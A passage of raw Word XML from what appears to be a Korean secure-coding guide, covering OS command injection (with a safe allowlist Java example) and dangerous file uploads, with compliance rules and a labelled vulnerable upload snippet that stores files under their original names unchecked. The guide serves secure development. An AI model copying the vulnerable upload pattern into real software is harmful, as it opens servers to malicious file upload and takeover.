                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>삭제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>백도어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>생성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>랜섬웨어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설치</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>운영체제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전체가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위협받습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>명령어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>목록에서만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>선택</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>List&lt;String&gt; allowed = Arrays.asList("notepad", "calc");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String cmd = args[0];</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (!allowed.contains(cmd)) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>System.err.println("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용되지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>않은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>명령어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>return;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Runtime.getRuntime().exec(cmd);</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="00D369CD" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">6. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>위험한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>형식</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>파일</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>업로드</w:t>
      </w:r>
      <w:r w:rsidR="00D369CD">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D369CD">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="006B3373">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>서버</w:t>
      </w:r>
      <w:r w:rsidR="005F7418">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005F7418">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>권한</w:t>
      </w:r>
      <w:r w:rsidR="005F7418">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005F7418">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>획득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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>화이트리스트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방식으로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허용된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확장자만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업로드를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허용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>업로드된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파일은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추측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불가능한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임의의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파일명으로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변경하여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저장한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일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저장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경로는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> web document root </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>밖에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위치시켜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웹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직접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접근을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차단한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일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실행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속성을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제거한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확장자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>업로드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String filename = file.getOriginalFilename();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>file.transferTo(new File("C:/webapp/upload/" + filename));</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
